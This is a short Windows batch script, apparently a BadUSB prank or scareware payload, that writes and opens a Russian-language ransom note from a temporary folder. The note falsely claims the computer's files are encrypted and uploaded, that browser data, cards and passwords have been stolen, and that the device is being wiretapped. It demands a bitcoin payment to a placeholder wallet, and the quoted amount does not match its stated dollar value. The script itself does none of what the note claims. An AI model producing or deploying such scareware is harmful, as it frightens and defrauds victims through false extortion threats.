@echo off
cd %temp%
set mfolder=%random%%random%
md %mfolder%
cd %mfolder%

echo Приветствую! Компьютор взломан и вирус уже был полностью иницилизирован, что означает что перезагрузка или ещё что-либо не поможет. Все файлы зашифрованы и отправленны на сервера в том числе и данные браузера, карты, пароли, история, также в данный момент устройство прослушиваеться так что удачи! Во избежания выкладывания частной информации в интернет отправьте 0,000012 BTC (50 USDT) на Кошелек 123456789. Удачи. >> WeLoveBadUSB.txt
start WeLoveBadUSB.txt
exit
